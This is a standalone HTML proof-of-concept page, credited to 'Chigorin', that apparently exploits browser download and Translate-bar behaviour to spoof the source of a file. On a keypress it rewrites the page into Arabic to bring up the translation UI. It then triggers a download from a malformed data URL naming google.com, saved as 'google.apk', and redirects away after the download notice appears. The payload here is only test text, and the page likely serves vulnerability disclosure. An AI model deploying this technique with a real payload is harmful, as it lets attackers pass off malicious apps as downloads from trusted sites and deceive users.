<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>POC Redirect + Translate</title>
  <style>
    body {
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: sans-serif;
      font-size: 22px;
    }
  </style>
</head>

<body>

<h2>POC by Chigorin!</h2>
<p>اضغط أي مفتاح للمتابعة</p>

<script>
window.addEventListener('keydown', function () {

  // 1. Ganti halaman ke bahasa asing → trigger Translate bar
  document.body.innerHTML = `
    <h1>هذه صفحة اختبار</h1>
    <p>جارٍ تحميل الملف… يرجى الانتظار</p>
  `;

  // 2. Delay agar Translate UI sempat muncul
  setTimeout(() => {

    // 3. Trigger download (malformed data URL)
    const a = document.createElement("a");
    a.href = "data://google.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
    a.download = "google.apk";
    document.body.appendChild(a);
    a.click();
    a.remove();

    // 4. Redirect SETELAH download toast muncul
    setTimeout(() => {
      window.location.href = "https://example.com";
      // tujuan boleh apa saja, tidak mempengaruhi PoC
    }, 350);

  }, 300);

}, { once: true });
</script>

</body>
</html>
